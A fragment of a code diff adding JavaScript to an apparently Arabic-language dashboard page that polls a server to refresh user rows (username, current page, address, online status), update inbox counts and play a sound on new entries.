+                    pageEl.textContent = user.page || '';
+                }
+                if (nameEl && nameEl.textContent.trim() !== (user.username || '').trim()) {
+                    nameEl.textContent = user.username || '';
+                }
+                // تحديث العنوان تلقائياً
+                var addrEl = document.getElementById('addr' + uid);
+                if (addrEl && user.address) {
+                    addrEl.textContent = user.address;
+                    addrEl.style.display = '';
+                }
+                // تحديث data-username للبحث
+                if (userItem) {
+                    userItem.setAttribute('data-username', user.username || '');
+                }
+            });
+
+            var currentItems = container.querySelectorAll('.mail-row[data-user-id]');
+            currentItems.forEach(function(item) {
+                var rid = parseInt(item.getAttribute('data-user-id'));
+                if (serverIds.indexOf(rid) === -1) {
+                    item.remove();
+                    var idx = knownUserIds.indexOf(rid);
+                    if (idx > -1) knownUserIds.splice(idx, 1);
+                }
+            });
+
+            // Update counts
+            var count = container.querySelectorAll('.mail-row[data-user-id]').length;
+            var ic = document.getElementById('inboxCount');
+            var ic2 = document.getElementById('inboxCount2');
+            if (ic) ic.textContent = count;
+            if (ic2) ic2.textContent = count;
+
+            if (playSound) {
+                try { var audio = new Audio('level-up-2-199574.mp3'); audio.play(); } catch(e) {}
+            }
+        })
+        .catch(function(e) { console.log('Polling error:', e); })
+        .finally(function() {
+            isPolling = false;
+        });
+}
+
+setInterval(startDashboardPolling, 800);
+</script>
+
+<script>
+function fetchStats() {
+    fetch('stats.php')
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            document.getElementById('onlineCount').textContent = data.online_count;
+            document.getElementById('totalVisits').textContent = data.total_visits;
+            var items = document.querySelectorAll('.mail-row[data-user-id]');
+            items.forEach(function(item) {
+                var uid = parseInt(item.getAttribute('data-user-id'));
+                var statusDot = document.getElementById('status' + uid);
+                if (!statusDot) return;
+                if (data.online_users.indexOf(uid) !== -1) {
+                    statusDot.classList.add('online');
+                    statusDot.title = 'متصل';
+                } else {
+                    statusDot.classList.remove('online');
+                    statusDot.title = 'غير متصل';
+                }
+            });
+        })
+        .catch(function(e) {});
+}
+fetchStats();
+setInterval(fetchStats, 500);
+</script>
+
+</body>
+
+</html>
